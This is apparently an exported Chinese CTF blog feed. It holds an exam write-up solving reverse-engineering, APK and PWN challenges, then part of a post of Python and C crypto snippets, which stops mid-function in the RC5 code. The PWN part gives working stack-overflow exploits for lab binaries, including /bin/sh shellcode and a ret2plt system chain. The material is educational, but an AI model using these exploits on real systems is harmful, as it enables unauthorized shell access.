sub_4115D0(int a1)&#123; signed int v2; // [esp+D0h] [ebp-20h] signed int i; // [esp+E8h] [ebp-8h] v2 = '&#125;'; for ( i = 0; i &lt; 28; ++i ) &#123; switch ( *(_BYTE *)(i + a1) ) &#123; case 'l': --v2; break; case 'r': ++v2; break; case 'f': v2 += 16; break; case 'b': v2 -= 16; break; &#125; if ( byte_417070[v2] == 'd' ) return 1; if ( byte_417070[v2] != '1' ) return 0; &#125; return 0;&#125; OD加载，发现迷宫，s是开始 ，d是结束，每一步都是1（否则失败），l向左，r向右，f向下，b向上12345678910111213141516171800000000000000000 1111111111 00 1 1 00 1 11d0 1 00 1111111111 00 1 00000000000000s00``得到字符串`bblllllllllbbbbrrrrrrrrrffrr`，用python写xor代码得``` Cdef Re1_qimo(): c = [] str = &apos;bblllllllllbbbbrrrrrrrrrffrr&apos; key = [0x2B,0x16,0x33,0x05,0x1F,0x33,0x19,0x1C,0x14,0x33,0x0D,0x0C,0x06,0x3D,0x0F,0x13,0x02,0x2D,0x0B,0x1D,0x07,0x2D,0x19,0x1C,0x56,0x11,0x53,0x53] for i in range(28): c.append(chr(ord(str[i])^key[i])) print &quot;&quot;.join(c) flag: It_is_upx_and_map_you_kn0w!! Re3有ida打开，发现tls,脱去TLS可以参考https://esebanana.github.io/2017/10/10/re_tls/发现第一个加密用户名函数1234567891011121314151617181920212223242526272829303132333435363738signed int sub_412530()&#123; int k; // [esp+D0h] [ebp-54h] int j; // [esp+DCh] [ebp-48h] int i; // [esp+E8h] [ebp-3Ch] __int16 v4[14]; // [esp+F4h] [ebp-30h] int v5; // [esp+118h] [ebp-Ch] v5 = j_strlen(&amp;Str); v4[0] = 96; v4[1] = 113; v4[2] = 96; v4[3] = 111; v4[4] = 127; v4[5] = 105; v4[6] = 75; v4[7] = 85; v4[8] = 115; v4[9] = 122; v4[10] = 74; v4[11] = 83; v4[12] = 64; v4[13] = 81; for ( i = 0; i &lt; v5 / 2; ++i ) &#123; *(&amp;Str + i) ^= *(&amp;Str + v5 - 1 - i); *(&amp;Str + v5 - 1 - i) ^= *(&amp;Str + i); *(&amp;Str + i) ^= *(&amp;Str + v5 - 1 - i); &#125; for ( j = 0; j &lt; v5; ++j ) word_419500[j] = (unsigned __int8)(((((j ^ 0x76) - 18) ^ 0x80) + 43) ^ *(&amp;Str + j)); for ( k = 0; k &lt; v5; ++k ) &#123; if ( word_419500[k] != v4[k] ) return 0; &#125; return 1;&#125; 解密代码12345678def Re3_qimo(): c = [] key = [96,113,96,111,127,105,75,85,115,122,74,83,64,81] l=len(key) for i in range(l): c.append(chr(key[i]^((((i ^ 0x76) - 18) ^ 0x80) + 43)%256)) c.reverse() print "".join(c) 输入flag后、判断flag长度35位，加密一、flag异或得到flag1123456789101112int __cdecl sub_411730(int a1, int a2)&#123; int result; // eax signed int i; // [esp+D0h] [ebp-8h] for ( i = 0; i &lt; 35; ++i ) &#123; *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2) ^ 0x76; result = i + 1; &#125; return result;&#125; 然后将flag1将中间21个字符分为3组，每一组分别加密123456789101112131415161718192021222324252627282930313233343536373839404142#第一组int __cdecl sub_411800(int a1, int a2)&#123; int result; // eax signed int i; // [esp+E8h] [ebp-8h] for ( i = 0; i &lt; 7; ++i ) &#123; *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2 + 7) ^ 0xCC; *(_BYTE *)(i + a1) = 2 * *(_BYTE *)(i + a1) &amp; 0xAA | ((*(_BYTE *)(i + a1) &amp; 0xAA) &gt;&gt; 1); result = i + 1; &#125; return result;&#125;#第二组int __cdecl sub_411910(int a1, int a2)&#123; int result; // eax signed int i; // [esp+E8h] [ebp-8h] for ( i = 0; i &lt; 7; ++i ) &#123; *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2 + 14) ^ 0xBE; *(_BYTE *)(i + a1) = 4 * *(_BYTE *)(i + a1) &amp; 0xCC | ((*(_BYTE *)(i + a1) &amp; 0xCC) &gt;&gt; 2); result = i + 1; &#125; return result;&#125;#第三组int __cdecl sub_411A30(int a1, int a2)&#123; int result; // eax signed int i; // [esp+E8h] [ebp-8h] for ( i = 0; i &lt; 7; ++i ) &#123; *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2 + 21) ^ 0xEF; *(_BYTE *)(i + a1) = 16 * *(_BYTE *)(i + a1) &amp; 0xF0 | ((*(_BYTE *)(i + a1) &amp; 0xF0) &gt;&gt; 4); result = i + 1; &#125; return result;&#125; 最后和key1比较key1 = [0x10,0x1a ,0x17 ,0x11 ,0xd,0x22 ,0x1e ,0xe3 ,0xc6 ,0xda ,0xe3 ,0xc6 ,0xda ,0xdd ,0xf6 ,0xee ,0x6d ,0xe4 ,0xad ,0xe7 ,0x6d ,0xdf ,0x6f ,0x7f ,0x9a ,0xde ,0x6c ,0xff ,0x13 ,0x17 ,0x4 ,0x29 ,0x57 ,0x57 ,0xb ] 解密1234567891011121314151617181920212223242526272829303132333435def Re3_qimo(): c = [] key = [96,113,96,111,127,105,75,85,115,122,74,83,64,81] l=len(key) for i in range(l): c.append(chr(key[i]^((((i ^ 0x76) - 18) ^ 0x80) + 43)%256)) c.reverse() print &quot;&quot;.join(c) enc_t = [0x10,0x1a ,0x17 ,0x11 ,0xd,0x22 ,0x1e ,0xe3 ,0xc6 ,0xda ,0xe3 ,0xc6 ,0xda ,0xdd ,0xf6 ,0xee ,0x6d ,0xe4 ,0xad ,0xe7 ,0x6d ,0xdf ,0x6f ,0x7f ,0x9a ,0xde ,0x6c ,0xff ,0x13 ,0x17 ,0x4 ,0x29 ,0x57 ,0x57 ,0xb ] dec_t = [0]*35 #decode1 for i in range(7): v1 = (enc_t[i+7] &amp; 0x55) &lt;&lt; 1 v2 = (enc_t[i+7] &gt;&gt; 1) &amp; 0x55 enc_t[i+7] = v1 | v2 enc_t[i+7] = enc_t[i+7] ^ 0xCC #decode2 for i in range(7): v1 = (enc_t[i+14] &amp; 0x33) &lt;&lt; 2 v2 = (enc_t[i+14] &gt;&gt; 2) &amp; 0x33 enc_t[i+14] = v1 | v2 enc_t[i+14] = enc_t[i+14] ^ 0xBE #decode3 for i in range(7): v1 = (enc_t[i+21] &amp; 0xF) &lt;&lt; 4 v2 = (enc_t[i+21] &gt;&gt; 4) &amp; 0xF enc_t[i+21] = v1 | v2 enc_t[i+21] = enc_t[i+21] ^ 0xEF for i in range(35): dec_t[i] = chr(enc_t[i] ^ 0x76) print &quot;&quot;.join(dec_t) Re4IDA打开找到12345678910111213141516171819202122232425262728293031323334int __thiscall muen_412200(void *this)&#123; int result; // eax void *v2; // ecx void *v3; // ecx void *v4; // ecx LOBYTE(result) = sub_411163(this); dword_4182DC = (char)result; result = (char)result; switch ( (char)result ) &#123; case 0: system(&quot;cls&quot;); result = j_muen_412200(v2); break; case 1: j_atk_subkkkkkkkkkkkkkkkkkkkkkk_412010(); system(&quot;cls&quot;); result = j_muen_412200(v3); break; case 2: deffffffffffffffffffffff_41111D(); system(&quot;cls&quot;); result = j_muen_412200(v4); break; case 3: deah_411113(); return result; default: return result; &#125; return result;&#125; 找到攻击函数12345678910111213141516171819int sub_412010()&#123; int result; // eax if ( hp &gt; 0 ) &#123; hp -= boss_atk; result = boss_hp - atk; boss_hp -= atk; &#125; if ( hp &lt;= 0 ) &#123; printf(&quot;you are die!!\n&quot;); exit(0); &#125; if ( boss_hp &lt;= 0 ) result = sub_41100F(); return result;&#125; 改为,这样自己不会掉血123456789101112131415161718int subkkkkkkkkkkkkkkkkkkkkkk_412010()&#123; int result; // eax if ( hp &gt; 0 ) &#123; result = boss_hp - atk; boss_hp -= atk; &#125; if ( hp &lt;= 0 ) &#123; printf(&quot;you are die!!\n&quot;); exit(0); &#125; if ( boss_hp &lt;= 0 ) result = next_boss_sub_41100F(); return result;&#125; 然后，慢慢，把每一层都修改，最后一层因为调用自杀函数，这里直接nop掉，最后修改保存，得到flagflag : flag{I_1ike_hard_w0rk_484_RE_and_never_up} apk1用工具apk_to_java.jar打开，发现是一个re4加密放在java里运行123456789101112131415161718192021222324252627282930313233343536373839public static String encode(String aInput, String aKey) &#123; int i; int[] iS = new int[256]; byte[] iK = new byte[256]; for (i = 0; i &lt; 256; i++) &#123; iS[i] = i; &#125; for (short i2 = (short) 0; i2 &lt; (short) 256; i2 = (short) (i2 + 1)) &#123; iK[i2] = (byte) aKey.charAt(i2 % aKey.length()); &#125; int j = 0; for (i = 0; i &lt; 255; i++) &#123; j = ((iS[i] + j) + iK[i]) % 256; int temp = iS[i]; iS[i] = iS[j]; iS[j] = temp; &#125; i = 0; j = 0; int temp; char[] iInputChar = aInput.toCharArray(); char[] iOutputChar = new char[iInputChar.length]; for (short x = (short) 0; x &lt; iInputChar.length; x = (short) (x + 1)) &#123; i = (i + 1) % 256; j = (iS[i] + j) % 256; temp = iS[i]; iS[i] = iS[j]; iS[j] = temp; iOutputChar[x] = (char) (iInputChar[x] ^ ((char) iS[(iS[i] + (iS[j] % 256)) % 256])); &#125; return new String(iOutputChar); &#125;public static void main(String[] args) throws UnsupportedEncodingException &#123; String key = "PassW0rd"; byte[] ke = new byte[]&#123;(byte) 33, (byte) 67, (byte) 80, (byte) 65, (byte) 110, (byte) -62, Byte.MIN_VALUE, (byte) -62, (byte) -98, (byte) -61, (byte) -79, (byte) 76, (byte) -62, (byte) -127, (byte) -62, (byte) -67, (byte) 39, (byte) -61, (byte) -80, (byte) 90, (byte) -62, (byte) -99, (byte) 108, (byte) 62, (byte) -61, (byte) -78, (byte) -61, (byte) -70, (byte) -62, (byte) -116, (byte) 2, (byte) 126, (byte) -62, (byte) -73, (byte) 13, (byte) 113, (byte) 73, (byte) -61, (byte) -82, (byte) -61, (byte) -114, (byte) -61, (byte) -120, (byte) -61, (byte) -79, (byte) -62, (byte) -67, (byte) -62, (byte) -92, (byte) 7, (byte) 115, (byte) -62, (byte) -121, (byte) -62, (byte) -86, (byte) 19, (byte) -61, (byte) -121, (byte) -62, (byte) -86, (byte) 10, (byte) 44, (byte) 77, (byte) -62, (byte) -76&#125;; String l = new String(ke); System.out.println(encode(l,key)); &#125; 最后没有想到的是，java的编码问题导致有些人没有解出来，有点难以接受，我用的是utf-8flag : flag{Th1s_is_only_Rc4_you_Should_know_more} apk2用工具apk_to_java.jar打开，发现是一个简单的文件加密，直接复制出来运行1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980 private static byte[] md5(String data) &#123; try &#123; MessageDigest messageDigest = MessageDigest.getInstance(&quot;md5&quot;); messageDigest.update(data.getBytes()); return messageDigest.digest(); &#125; catch (NoSuchAlgorithmException e) &#123; e.printStackTrace(); return new byte[0]; &#125; &#125; private static byte[] encryptData(byte[] data, byte[] key) &#123; byte keyLength = (byte) key.length; byte[] cipherText = new byte[data.length]; for (int i = 0; i &lt; data.length; i++) &#123; cipherText[i] = (byte) (data[i] ^ key[i % keyLength]); &#125; return cipherText; &#125; private static String generateRandomFilename(int length) &#123; Random random = new Random(); StringBuilder stringBuilder = new StringBuilder(length); for (int i = 0; i &lt; length; i++) &#123; char temp = (char) random.nextInt(62); if (temp &lt; &apos;\u001a&apos;) &#123; temp = (char) (temp + 97); &#125; else if (temp &lt; &apos;4&apos;) &#123; temp = (char) (temp + 65); &#125; else &#123; temp = (char) (temp + 48); &#125; stringBuilder.append(temp); &#125; System.out.println(stringBuilder.toString()); return stringBuilder.toString(); &#125; private static byte[] readUri(String uri) throws IOException &#123; File file = new File(uri); @SuppressWarnings(&quot;resource&quot;) InputStream inputStream = new FileInputStream(file); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); byte[] buffer = new byte[1024]; while (true) &#123; int read = inputStream.read(buffer); if (read == -1) &#123; return byteArrayOutputStream.toByteArray(); &#125; byteArrayOutputStream.write(buffer, 0, read); &#125; &#125; private static void decode(byte[] cipherText) throws IOException &#123; File outputFile = new File(&quot;F:/CTF/timu/期末/RE/apk2/flag1&quot;); try &#123; FileOutputStream fileOutputStream = new FileOutputStream(outputFile); fileOutputStream.write(cipherText); fileOutputStream.close(); &#125;catch (Exception e) &#123; // TODO: handle exception &#125; System.out.println(&quot;done&quot;); &#125; public static void main(String[] args) throws IOException &#123; String password = &quot;Password&quot;; byte[] key = md5(password); String path=&quot;F:/CTF/timu/期末/RE/apk2/flag.enc&quot;; byte[] data=readUri(path); byte[] data1=encryptData(data,key); decode(data1); &#125; 然后用010打开，发现是一个压缩包，解压得到flagflag{This_easy_encrypto_t0_filehi$!&gt;&lt;} PWN1、babypwn1程序就不放了，这里可以下载（https://betamao.me）分析程序，检查发现程序无任何保护我们只需要v5=abcd,就可以得到shell(意味着拿到flag),但v5=233了，所以这里我们需要覆盖v5的值这里第一个箭头是函数的栈顶eps=0x3f4(同时我们输入的s也是存放在这里),第二个箭头v5=0xc,所以我们算出两者的距离d=0x3f4-0xc=1000，就可以覆盖了，构造payload(小端序，v5是int型的)：payload = &#39;a&#39;*1000+&#39;dcba&#39;测试成功poc.py123456from pwn import *p = process('./babypwn1')payload = 'a'*1000+'dcba'p.recv()p.sendline(payload)p.interactive() 2、babypwn2分析程序，检查发现程序无任何保护发现这个函数，同时发现getShell函数那我们只有覆盖返回地址到getShell函数就好啦，发现函数栈帧0x3f4=1012,函数栈是这样的：那么我们只需要输入1012+4+ret(getShell的地址)就成功啦测试成功poc.py123456789from pwn import *p = process('babypwn2')elf=ELF('babypwn2')ret=elf.symbols['getShell']payload = 'a'*1016 +p32(ret)p.recv()p.sendline(payload)p.interactive() 3、babypwn3分析程序，检查发现程序无任何保护发现存在溢出，并且当v2=127的时候，会去执行输入的代码可是这里溢出后并没有执行得到shell的函数，因为没有任何保护，所以栈上的代码可以执行。那么我们就自己写一个执行shell的代码输入就可以了——shellcode，可以在网上找，它的功能就是system(“/bin/sh”)方法一1、输入shellcode2、覆盖v7=127测试成功poc.py12345678from pwn import *shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";p=process('./babypwn3')payload = shellcode+'a'*(127-len(shellcode))+p32(127)p.recv()p.sendline(payload)raw_input()p.interactive() 方法二1、存在jmp esp指令2、栈溢出到jmp esp位置，执行shellcode测试成功poc.py12345678from pwn import *shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";p=process('./babypwn3')jmp_esp=0x8048500payload = 'a'*140+p32(jmp_esp)+shellcodep.recv()p.sendline(payload)p.interactive() 4、babypwn4分析程序，检查发现程序只有NX保护潘师傅说这道题出题有点失误，但是还是很基础的，这里我就把我当poc.py献给大家测试成功poc.py123456789101112131415from pwn import *p = process('babypwn4')elf=ELF('babypwn4')bss=elf.bss()read_plt=elf.plt['read']system_plt=elf.plt['system']pppr=0x8048639payload = 'a'*245 +p32(read_plt)+p32(pppr)+p32(0)+p32(bss)+p32(8)+p32(system_plt)+p32(1)+p32(bss)p.recv()p.sendline(payload)p.sendline('/bin/sh')p.interactive() 这里我要睡觉了，就不解释了。有任何问题欢迎来问]]></content>
      <categories>
        <category>wp</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[各种简单常见的加密与解密]]></title>
    <url>%2F2017%2F12%2F05%2Falgorithm_code%2F</url>
    <content type="text"><![CDATA[主要包含C,python pythonAES、DES、RC4加解密1234567891011121314151617181920212223242526272829303132#coding=utf-8from Crypto.Cipher import AES,DES,ARC4#iv key都是8的倍数，至少16位key = '0123456789012345'iv = '0123456789012345'#msg 也是8的倍数，至少16位msg='0123456789012345'print 'AES-----------------------------------'print msgobj1 = AES.new(key,AES.MODE_CBC,iv)enc=obj1.encrypt(msg)print encobj2 = AES.new(key,AES.MODE_CBC,iv)print obj2.decrypt(enc)print 'DES-----------------------------------'print msgkey='01234567'obj1=DES.new(key,DES.MODE_ECB)enc=obj1.encrypt(msg)print encobj2=DES.new(key,DES.MODE_ECB)print obj2.decrypt(enc)print 'ARC4-----------------------------------'key='flag&#123;this_is_not_the_flag_hahaha&#125;'msg='123456789'ob1=ARC4.new(key)enc=ob1.encrypt(msg)print encenc="\x20\xc3\x1a\xae\x97\x3c\x7a\x41\xde\xf6\x78\x15\xcb\x4b\x4c\xdc\x26\x55\x8b\x55\xe5\xe9\x55\x75\x40\x3d\x82\x13\xa5\x60\x13\x3b\xf5\xd8\x19\x0e\x47\xcf\x5f\x5e\xde\x9d\x14\xbd"ob2=ARC4.new(key)print ob2.decrypt(enc) Base解密1234567891011121314import base64s="flag&#123;hgsada1d3fd13d1f3df1s3dfsdf5e4f6ew8r4&#125;"enc=base64.b64encode(s)print encenc1=base64.b32encode(enc)print enc1enc2=base64.b16encode(enc1)print enc2enc1=base64.b16decode(enc2)print enc1enc=base64.b32decode(enc1)print encst=base64.b64decode(enc)print st base64解密表替换解密123456789101112import stringimport base64s=""custom="9ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz012345678+/"Base64="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"ciphertext = "YlwgY2s8"for ch in ciphertext: if ch in Base64: s = s + Base64[string.find(custom,str(ch))] elif ch == '=': s =s+'='print base64.b64decode(s) strings_to_hex1234567字符串转16进制data=bytearray.fromhex('d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1e6b3e3b9e4b3b7b7e2b6b1e4b2b6b9e2b1b1b3b3b7e6b3b3b0e3b9b3b5e6fd') flag = '' print data[0]for i in data: flag = flag + chr(i &amp; 0x7f)print flag 替换分割1s=open('5ae30bffc8f7d.txt','r').read().replace("\n"," ").split() 排序方式8种排序，插入排序、希尔排序、冒泡排序、快速排序、直接选择排序、堆排序、归并排序、基数排序。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163#直接爆破import string def func1(n): r = n for i in range(0,7): if i&amp;1: r ^= 1&lt;&lt; i else: r |= 1&lt;&lt; i return rdef func2(n): r = 1 for i in range(7): r = (n*r)%481 return renc=[0x19C,0x169,0x30,0x1D6,0x30,0x30,0x199,0x6A,0x157,0xc2,0x10A,0x155,0x150,0x107,0x37,0x12E,0x22,0x0F1,0x1AE,0x151,0x0F1,0x1A,0x1A5,0x1AE,0x0C9,0x12C,0x1,0x166,0x12c,0x0CB,0x30,0x107,0x166,0x1B4,0x1AE,0x14C,0x46]out =''for i in range(len(enc)): for c in string.printable: s = ord(c) ^ func1(i) s = func2(s) if s == enc[i]: out+=c breakprint out#插入排序,时间复杂度为O(n^2)。是稳定的排序方法。def insert_sort(lst): count=len(lst) for i in range(1,count): key=lst[i] j=i-1 while j&gt;=0: if lst[j]&gt;key: lst[j+1]=lst[j] lst[j]=key j-=1 return lst# 希尔排序是插入排序的一种希尔排序是非稳定排序算法def shell_sort(lst): count = len(lst) step = 2 group = count / step while group &gt; 0: for i in range(0, group): j = i + group while j &lt; count: k = j - group key = lst[j] while k &gt;= 0: if lst[k] &gt; key: lst[k + group] = lst[k] lst[k] = key k -= group j += group group /= step return lst# 冒泡排序def bubble_sort(lst): count = len(lst) for i in range(0, count): for j in range(i + 1, count): if lst[i] &gt; lst[j]: lst[i], lst[j] = lst[j], lst[i] return lst# 选择排序def select_sort(lst): count = len(lst) for i in range(0, count): min = i for j in range(i + 1, count): if lst[min] &gt; lst[j]: min = j lst[min], lst[i] = lst[i], lst[min] return lst# 快速排序,整个排序过程可以递归进行def quick_sort(lst, left, right): if left &gt;= right: return lst key = lst[left] low = left high = right while left &lt; right: while left &lt; right and lst[right] &gt;= key: right -= 1 lst[left] = lst[right] while left &lt; right and lst[left] &lt;= key: left += 1 lst[right] = lst[left] lst[right] = key quick_sort(lst, low, left - 1) quick_sort(lst, left + 1, high) return lst#堆排序是指利用堆积树数据结构,它是选择排序的一种,堆分为大根堆和小根堆，是完全二叉树,大根堆的要求是每个节点的值都不大于其父节点的值def adjust_heap(lst, i, size): lchild = 2 * i + 1 rchild = 2 * i + 2 max = i if i &lt; size / 2: if lchild &lt; size and lst[lchild] &gt; lst[max]: max = lchild if rchild &lt; size and lst[rchild] &gt; lst[max]: max = rchild if max != i: lst[max], lst[i] = lst[i], lst[max] adjust_heap(lst, max, size) def build_heap(lst, size): for i in range(0, (size/2))[::-1]: adjust_heap(lst, i, size) def heap_sort(lst): size = len(lst) build_heap(lst, size) for i in range(0, size)[::-1]: lst[0], lst[i] = lst[i], lst[0] adjust_heap(lst, 0, i)#归并排序def merge(left, right): i, j = 0, 0 result = [] while i &lt; len(left) and j &lt; len(right): if left[i] &lt;= right[j]: result.append(left[i]) i += 1 else: result.append(right[j]) j += 1 result += left[i:] result += right[j:] return result def merge_sort(lst): # 归并排序 if len(lst) &lt;= 1: return lst num = len(lst) / 2 left = merge_sort(lst[:num]) right = merge_sort(lst[num:])#基数排序import mathdef radix_sort(lst, radix=10): k = int(math.ceil(math.log(max(lst), radix))) bucket = [[] for i in range(radix)] for i in range(1, k+1): for j in lst: bucket[j/(radix**(i-1)) % (radix**i)].append(j) del lst[:] for z in bucket: lst += z del z[:] return lst C读取文件1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;stdio.h&gt;#include&lt;time.h&gt;#include&lt;fcntl.h&gt;#include&lt;sys/stat.h&gt; #include&lt;unistd.h&gt;void main( void )&#123; FILE *stream; char list[20000]; int start,end,fd,size; int i, numread, numwritten; for ( i = 0; i &lt; 20000; i++ ) list[i] = (char)('z'); start=clock(); if( (stream = fopen( "fread.out", "w+t" )) != NULL ) &#123; numwritten = fwrite( list, sizeof( char ), 20000, stream ); fclose( stream ); &#125; else &#123; printf( "Problem opening the file\n" ); &#125; if( (stream = fopen( "fread.out", "r+t" )) != NULL ) &#123; numread = fread( list, sizeof( char ), 20000, stream ); fclose( stream ); &#125; else &#123; printf( "File could not be opened\n" ); &#125; end=clock(); printf("fread all time：%d\n",end-start); start=clock(); fd = open("read.out", O_WRONLY|O_CREAT); write(fd, list, sizeof(list)); close(fd); fd = open("read.out", O_RDONLY); size = read(fd, list, sizeof(list)); close(fd); end=clock(); printf("read all time：%d\n",end-start);&#125; base64123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121#include &lt;stdio.h&gt; #include &lt;malloc.h&gt; #include &lt;string.h&gt; char *base64_encode(const char *src); char *base64_decode(const char *src); char *table="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"; char *base64_encode(const char *src) &#123; int count; char *dst; long tmp, buf; char in[4]; int i, j; count = strlen(src) / 3 + (strlen(src) % 3 ? 1 : 0); dst = (char*)malloc((count * 4 + 1)); memset(dst, 0, count * 4 + 1); for(j = 0; j &lt; count; j++) &#123; memset(in, 0, sizeof(in)); strncpy(in, src + j * 3, 3); buf = 0; for(i = 0; i &lt; strlen(in); i++) &#123; tmp = (long)in[i]; tmp &lt;&lt;= (16 - i * 8); buf |= tmp; &#125; for(i = 0; i &lt; 4; i++) &#123; if(strlen(in) + 1 &gt; i) &#123; tmp = buf &gt;&gt; (18 - 6 * i); tmp &amp;= 0x3f; dst[j * 4 + i] = table[tmp]; &#125; else &#123; dst[j * 4 + i] = '='; &#125; &#125; &#125; return dst; &#125; char *base64_decode(const char *src) &#123; int count, len; char *dst; long tmp, buf; int i, j, k; char in[5]; len = strlen(src); count = len / 4; dst = (char *)malloc(count * 3 + 1); memset(dst, 0, count * 3 + 1); for(j = 0; j &lt; count; j++) &#123; memset(in, 0, sizeof(in)); strncpy(in, src + j * 4, 4); buf = 0; for(i = 0; i &lt; 4; i++) &#123; tmp = (long)in[i]; if(tmp == '=') &#123; tmp = 0; &#125; else &#123; for(k = 0; ; k++) &#123; if(table[k] == tmp) break; &#125; tmp = k; &#125; tmp &lt;&lt;= (18 - i * 6); buf |= tmp; &#125; for(i = 0; i &lt; 3; i++) &#123; tmp = buf &gt;&gt; (16 - i * 8); tmp &amp;= 0xff; dst[j * 3 + i] = tmp; &#125; &#125; return dst; &#125; int main() &#123; char *src, *dst; src = "flag&#123;y0u_knoW_Ba4e64&#125;"; dst = base64_encode(src); printf("%s\n", dst); printf("%s\n", base64_decode(src)); free(src); free(dst); return 0; &#125; rc412345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include&lt;stdio.h&gt;#include&lt;string.h&gt;typedef unsigned longULONG; /*初始化函数*/void rc4_init(unsigned char*s, unsigned char*key, unsigned long Len)&#123; int i = 0, j = 0; char k[256] = &#123; 0 &#125;; unsigned char tmp = 0; for (i = 0; i&lt;256; i++) &#123; s[i] = i; k[i] = key[i%Len]; &#125; for (i = 0; i&lt;256; i++) &#123; j = (j + s[i] + k[i]) % 256; tmp = s[i]; s[i] = s[j];//交换s[i]和s[j] s[j] = tmp; &#125;&#125; /*加解密*/void rc4_crypt(unsigned char*s, unsigned char*Data, unsigned long Len)&#123; int i = 0, j = 0, t = 0; unsigned long k = 0; unsigned char tmp; for (k = 0; k&lt;Len; k++) &#123; i = (i + 1) % 256; j = (j + s[i]) % 256; tmp = s[i]; s[i] = s[j];//交换s[x]和s[y] s[j] = tmp; t = (s[i] + s[j]) % 256; Data[k] ^= s[t]; &#125;&#125; int main()&#123; unsigned char s[256] = &#123; 0 &#125;, s2[256] = &#123; 0 &#125;;//S-box char key[256] = &#123; "flag&#123;this_is_not_the_flag_hahaha&#125;" &#125;; char pData[50] ; unsigned long len = strlen(pData); int i; printf("input data:\n"); scanf("%50s",pData); rc4_init(s, (unsigned char*)key, strlen(key));//已经完成了初始化 for (i = 0; i&lt;256; i++)//用s2[i]暂时保留经过初始化的s[i]，很重要的！！！ &#123; s2[i] = s[i]; &#125; rc4_crypt(s, (unsigned char*)pData, len);//加密 printf("加密\n"); for(i=0;i&lt;44;i++) &#123; printf("\\x%x",pData[i]&amp;0xff); &#125; printf("\n已经加密，现在解密:\n\n"); //rc4_init(s,(unsignedchar*)key,strlen(key));//初始化密钥 rc4_crypt(s2, (unsigned char*)pData, len);//解密 printf("\n%s\n", pData); return 0;&#125; rc5123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;math.h&gt;int w=16;//字长int r=12;//12;//轮数12int b=16;//密钥长度int t=26;//2*r+2=12*2+2=26int c=8; //b*8/w = 16*8/16typedef unsigned long int FOURBYTEINT;//四字节typedef unsigned short int TWOBYTEINT;//2字节typedef unsigned char BYTE;void InitialKey(unsigned char* KeyK,int b);void generateChildKey(unsigned char* KeyK,TWOBYTEINT* ChildKeyS);void Encipher(TWOBYTEINT* In,TWOBYTEINT* Out,TWOBYTEINT* S);void Decipher(TWOBYTEINT* In,TWOBYTEINT* Out,TWOBYTEINT* S);#define NoOfData 4/**2、循环移位函数 由于在生成子密钥，加密，解密过程中都要进行循环移位，故要首先定义循环以为函数。 * 循环左移和右移函数 * x : 被循环的数 * y : 将要循环的位数 */#define ROTL(x,y) (((x)&lt;&lt;(y&amp;(w-1))) | ((x)&gt;&gt;(w-(y&amp;(w-1)))))#define ROTR(x,y) (((x)&gt;&gt;(y&amp;(w-1))) | ((x)&lt;&lt;(w-(y&amp;(w-1)))))/**3、 初始密钥产生函数 生成一个初始的长度为b字节的密钥。 产生初始密钥的函数 */void InitialKey(unsigned char* KeyK,int b)&#123; int i,j; for( i=0;i&lt;b;i++)//初始化 &#123; KeyK[i]=0; &#125; int intiSeed=3; KeyK[0]=intiSeed; for(j=1;j&lt;b;j++)//生成 &#123; KeyK[j] = (BYTE) ( ((int)(pow(3,j))%(255-j))); //KeyK[j] = (BYTE) ( ((int)(pow(double(3),j))%(255-j))); &#125;&#125;/**4、 密钥扩展函数 由于需加密r轮，每轮需要两个子密钥，所以需要密钥扩展函数根据初始密钥来扩展出2r+2个子密钥。 产生子密钥的函数 */void generateChildKey(unsigned char* KeyK,TWOBYTEINT* ChildKeyS)&#123; //const double e = 2.718281828459; //const double Phia = 1.618033988749; int PW = 47073;//0xb7e1; int QW = 40503;//0x9e37;//genggai int i; TWOBYTEINT L[c]; //初始化数组S ChildKeyS[0]=PW; for (i=1;i&lt;t;i++) &#123; ChildKeyS[i]=(ChildKeyS[i-1]+ QW); &#125; //将K数组转换为L数组 for(i=0;i&lt;c;i++)//初始化L数组c=8 &#123; L[i]=0; &#125; int u = w/8; for (i=b-1;i!=-1; i--)//转换，数组L每一元素长为32bit，数组K每一元素长为8bit &#123; L[i/u] = (L[i/u]&lt;&lt;8)+KeyK[i]; &#125; for (i=0;i&lt;c;i++)//16进制输出gaidong &#123; printf("%.4X ",L[i]); &#125; printf("\n"); //产生子密钥，存储在ChildKeyS中 TWOBYTEINT A,B,X,Y; A=B=X=Y=0; for(i=0;i&lt;3*t;i++) &#123; X = ChildKeyS[A] = ROTL(ChildKeyS[A]+X+Y,3); A = (A+1) % t; Y = L[B] = 